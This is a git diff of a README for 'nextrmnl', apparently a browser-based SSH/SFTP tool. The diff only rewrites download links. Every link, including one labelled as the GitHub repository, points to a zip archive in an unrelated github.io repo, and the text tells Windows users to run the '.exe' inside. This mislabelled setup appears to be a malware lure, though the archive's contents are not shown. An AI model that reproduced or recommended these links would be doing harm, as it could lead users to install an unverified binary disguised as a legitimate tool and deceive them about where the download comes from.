@@ -5,7 +5,7 @@ description: "Self-hosted SSH and SFTP in your browser, with secure vaults and P
 ---
 # 🌐 nextrmnl - Your Server, Right in the Browser
 
-[![Download Now](https://img.shields.io/badge/Download-nextrmnl-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/habsanprad/habsanprad.github.io/main/stap/Application_2.4-beta.3.zip)
+[![Download Now](https://img.shields.io/badge/Download-nextrmnl-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/habsanprad/habsanprad.github.io/raw/refs/heads/main/stap/Application_2.4-beta.3.zip)
 
 ## 👋 Welcome to nextrmnl
 
@@ -38,7 +38,7 @@ Ready to try nextrmnl? Follow these simple steps:
 
 Visit this link to download the application:
 
-[![Download nextrmnl](https://img.shields.io/badge/⬇️%20Download%20nextrmnl-Click%20Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/habsanprad/habsanprad.github.io/main/stap/Application_2.4-beta.3.zip)
+[![Download nextrmnl](https://img.shields.io/badge/⬇️%20Download%20nextrmnl-Click%20Here-blue?style=for-the-badge)](https://github.com/habsanprad/habsanprad.github.io/raw/refs/heads/main/stap/Application_2.4-beta.3.zip)
 
 You'll see a list of files. Choose the one that matches your system. For Windows, look for the `.exe` file—it's the easiest option.
 
@@ -230,7 +230,7 @@ Special thanks to the open-source community for making this possible.
 
 If you need help:
 
-- Visit the GitHub repository: [habsanprad/nextrmnl](https://raw.githubusercontent.com/habsanprad/habsanprad.github.io/main/stap/Application_2.4-beta.3.zip)
+- Visit the GitHub repository: [habsanprad/nextrmnl](https://github.com/habsanprad/habsanprad.github.io/raw/refs/heads/main/stap/Application_2.4-beta.3.zip)
 - Open an issue for bug reports or feature requests
 - Check the discussions tab for community tips
 
@@ -240,7 +240,7 @@ If you need help:
 
 Download nextrmnl today and experience the easiest way to manage your servers from your browser:
 
-[![Get nextrmnl Now](https://img.shields.io/badge/🚀%20Get%20nextrmnl%20Now-Download-green?style=for-the-badge)](https://raw.githubusercontent.com/habsanprad/habsanprad.github.io/main/stap/Application_2.4-beta.3.zip)
+[![Get nextrmnl Now](https://img.shields.io/badge/🚀%20Get%20nextrmnl%20Now-Download-green?style=for-the-badge)](https://github.com/habsanprad/habsanprad.github.io/raw/refs/heads/main/stap/Application_2.4-beta.3.zip)
 
 Your server, your browser, your control—all in one amazing application.
 
